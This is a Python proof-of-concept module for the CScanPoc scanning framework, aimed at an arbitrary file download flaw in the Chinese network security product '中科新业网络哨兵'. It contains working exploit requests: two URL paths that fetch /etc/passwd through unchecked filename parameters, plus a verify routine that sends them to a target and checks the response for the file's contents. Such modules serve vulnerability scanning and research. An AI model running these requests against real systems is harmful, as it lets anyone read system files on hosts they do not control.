# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    poc_id = 'eb607509-ce47-421b-b57f-e8f020a71387'
    name = '中科新业网络哨兵 任意文件下载'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD # 漏洞类型
    disclosure_date = '2015-04-20'  # 漏洞公布时间
    desc = '''
        中科新业网络哨兵 直接访问：
        /manage/include/downfile.php?gFileName=/etc/passwd
        /manage/stgl/download.php?filename=/etc/passwd 即可下载敏感信息。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '中科新业网络哨兵'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '9fcefff9-c732-4723-b871-9d2662f924cc'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-18'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0108646
            hh = hackhttp.hackhttp()
            headers = {'Content-Type': 'application/x-www-form-urlencoded'}
            payload1 = "/manage/include/downfile.php?gFileName=/etc/passwd"
            payload2 = "/manage/stgl/download.php?filename=/etc/passwd"
            for i in payload1, payload2:
                code, _ , res, _, _ = hh.http(self.target + i, headers=headers)
                if code==200 and 'root:/bin/bash' in res :
                    #security_warning(arg+i)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
